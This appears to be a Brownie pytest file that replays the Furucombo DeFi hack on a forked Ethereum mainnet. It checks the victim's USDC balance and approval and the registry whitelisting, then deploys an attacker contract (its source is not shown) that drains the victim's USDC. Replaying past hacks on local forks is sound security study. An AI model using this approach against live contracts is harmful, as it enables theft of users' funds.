import pytest
from brownie import accounts
from setup_fixtures import brownie_project, eth_fork_network

# explanation: https://cmichel.io/replaying-ethereum-hacks-furucombo/

VICTIM_ADDRESS = '0x13f6f084e5faded2276def5149e71811a7abeb69'
FURUCOMBO_PROXY_ADDR = '0x17e8Ca1b4798B97602895f63206afCd1Fc90Ca5f'
AAVE_V2_PROXY_ADDR = '0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9'
USDC_ADDRESS = '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48'

@pytest.mark.fork_blocknumber(11940499)
def test_victim_has_funds_and_approved_furucombo_proxy(eth_fork_network, brownie_project):
    usdc = brownie_project.interface.IERC20(USDC_ADDRESS)
    victim_usdc_balance = usdc.balanceOf(VICTIM_ADDRESS)
    furucombo_allowance = usdc.allowance(VICTIM_ADDRESS, FURUCOMBO_PROXY_ADDR)
    assert victim_usdc_balance > 0
    assert furucombo_allowance > 0

@pytest.mark.fork_blocknumber(11940499)
def test_aave_proxy_is_whitelisted_in_registry(eth_fork_network, brownie_project):
    # private field, needs to be read from storage
    # keccak256 hash of "furucombo.handler.registry" -> also hardcoded in the contract
    HANDLER_REGISTRY_SLOT = '0x6874162fd62902201ea0f4bf541086067b3b88bd802fac9e150fd2d1db584e19'
    registry_addr_hexbytes = eth_fork_network.web3.eth.get_storage_at(FURUCOMBO_PROXY_ADDR, HANDLER_REGISTRY_SLOT)
    registry_addr = eth_fork_network.web3.toHex(registry_addr_hexbytes)

    registry = brownie_project.interface.IRegistry(registry_addr)

    assert registry.isValid(AAVE_V2_PROXY_ADDR)

@pytest.mark.fork_blocknumber(11940499)
def test_hack(eth_fork_network, brownie_project):
    usdc = brownie_project.interface.IERC20(USDC_ADDRESS)

    attacker_eoa = accounts[0]
    attacker_starting_balance = usdc.balanceOf(attacker_eoa.address)
    victim_starting_balance = usdc.balanceOf(VICTIM_ADDRESS)
    attacker_contract = brownie_project.Attacker.deploy({'from': attacker_eoa})

    attacker_contract.setup()
    attacker_contract.attack(USDC_ADDRESS, VICTIM_ADDRESS)
    assert usdc.balanceOf(attacker_eoa.address) == attacker_starting_balance + victim_starting_balance